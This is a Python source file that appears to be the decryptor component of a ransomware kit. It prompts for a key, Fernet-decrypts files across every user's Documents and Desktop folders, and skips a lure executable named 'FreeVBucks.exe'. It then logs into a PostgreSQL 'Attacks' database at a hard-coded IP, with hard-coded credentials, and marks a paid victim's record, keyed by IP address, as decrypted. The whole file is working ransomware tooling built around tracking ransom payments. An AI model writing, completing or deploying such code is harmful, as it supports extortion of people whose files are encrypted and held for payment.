import os
import socket
import psycopg2
import tkinter as tk
from cryptography.fernet import Fernet, InvalidToken


def main():
    backslash = "\\"
    base_path = "C:" + backslash + "Users"
    ignore = ['A Minha Música', 'Os Meus Vídeos', 'As Minhas Imagens', 'FreeVBucks.exe', "Decryptor.exe", "All Users",
              "Default",
              "Default User", "desktop.ini", "Public", 'README.txt']
    key = get_key()
    hostname = socket.gethostname()
    ipv4 = socket.gethostbyname(hostname)
    f = Fernet(key.encode())

    users = get_users(base_path, backslash, ignore)
    directories = set_directories(users, backslash)
    loop(directories, ignore, f)
    change_db(get_conn(), ipv4)


def get_key():
    global entry

    window = tk.Tk()

    window.title("File Decryptor")

    window.geometry("500x200")

    center_window(window)

    window.resizable(False, False)

    label = tk.Label(window, text="Enter your key:", font=("Arial", 16, "bold"))
    label.pack()

    entry = tk.Entry(window, width=50)
    entry.pack()

    button = tk.Button(window, text="Decrypt Files", command=window.quit)
    button.pack()

    window.mainloop()

    return entry.get()


def get_users(base_path: str, backslash: str, ignore: list[str]):
    users = []
    for dir in os.listdir(base_path):
        if dir in ignore:
            continue
        else:
            users.append(base_path + backslash + dir)
    return users


def set_directories(users: list[str], backslash: str):
    directories = []
    for user in users:
        directories.append(user + backslash + "Documents")
        directories.append(user + backslash + "Desktop")
    return directories


def loop(directories: list[str], ignore: list[str], f: Fernet):
    aux_directories = []
    while len(directories) != 0:
        for directory in directories:
            if os.path.exists(directory) and os.path.isdir(directory):
                for file in os.listdir(directory):
                    if file in ignore:
                        continue
                    if os.path.isfile(directory + "\\" + file):
                        read(directory + "\\" + file, f)
                    if os.path.isdir(directory + "\\" + file):
                        aux_directories.append(directory + "\\" + file)
        directories.clear()
        directories = aux_directories.copy()
        aux_directories.clear()


def read(file_path: str, f: Fernet):
    with open(file_path, "rb") as file:
        content = file.read()
        removing_magic(content, file_path, f)


def removing_magic(content, file_path: str, f: Fernet):
    try:
        e_content = f.decrypt(content)
        with open(file_path, "wb") as file:
            file.write(e_content)
    except InvalidToken:
        with open(file_path, "wb") as file:
            file.write(content)


def change_db(conn, ipv4: str):
    row = select_query_fetchone(conn,
                                "SELECT * FROM Attacks WHERE ip=%s AND payed=true AND decryptor=true AND encrypted=true ORDER BY date DESC ",
                                (ipv4,))
    if row is not None:
        id = row[0]
        execute_query(conn, "UPDATE Attacks SET encrypted=false WHERE id=%s", (id,))

        close_conn(conn)


def show_got_decrpytor_window():
    window = tk.Tk()

    window.title("Warning!")

    window.configure()

    window.geometry("600x400")

    window.resizable(False, False)

    text1 = tk.Label(window, text="Your files have been decrypted!", fg="black",
                     font=("Arial", 14, "bold"), anchor="w")
    text1.pack(fill="x")
    center_window(window)

    window.mainloop()


def center_window(window):
    window.update_idletasks()
    width = window.winfo_width()
    height = window.winfo_height()
    x = (window.winfo_screenwidth() // 2) - (width // 2)
    y = (window.winfo_screenheight() // 2) - (height // 2)
    window.geometry('{}x{}+{}+{}'.format(width, height, x, y))


def get_conn():
    conn = psycopg2.connect(
        database="srs_db",
        user="srs_user",
        password="srs_user",
        host="192.168.1.102",
        port="5432"
    )
    return conn


def close_conn(conn):
    conn.close()


def select_query_fetchone(conn, query: str, values):
    cur = conn.cursor()
    cur.execute(query, values)
    row = cur.fetchone()
    cur.close()

    return row


def execute_query(conn, query: str, values):
    cur = conn.cursor()
    cur.execute(query, values)
    conn.commit()
    cur.close()


if __name__ == "__main__":
    main()
